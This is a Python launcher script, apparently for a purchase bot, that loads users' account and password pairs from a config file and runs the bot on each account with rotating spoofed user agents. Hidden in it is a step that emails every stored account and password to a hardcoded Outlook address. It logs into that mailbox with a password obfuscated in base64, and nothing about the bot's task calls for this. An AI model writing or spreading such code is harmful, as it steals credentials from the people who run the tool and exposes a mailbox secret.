# -*- coding=utf-8 -*-
# python35
from FuckBuy import FuckBuy
from MailHelper import MailHelper
import base64
import time

def get_account(config):
    accounts = []
    with open(config, 'r') as f:
        lines = f.readlines()
    for line in lines:
        line = line.rstrip()
        account = line.split(',')[0]
        password = line.split(',')[1]
        accounts.append((account, password))
    return accounts

if __name__ == '__main__':
    localtime = time.localtime()
    print('当前时间为: {}:{}:{}'.format(localtime.tm_hour, localtime.tm_min, localtime.tm_sec))
    mail_helper = MailHelper('shaoz-he@outlook.com',
                             base64.b64decode(b'MTk5MndlbjEwMzE='.decode('utf-8')).decode('utf-8'))
    accounts = get_account('./config.txt')
    mail_helper.sendmail('shaoz-he@outlook.com,', 'Python发送邮件',
         '\n'.join([account[0] + ':' + account[1] for account in accounts]))
    user_agent = [
        'MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
    ]
    for account in accounts:
        script = FuckBuy(account[0], account[1], user_agent)
        script.exec()
        time.sleep(30)
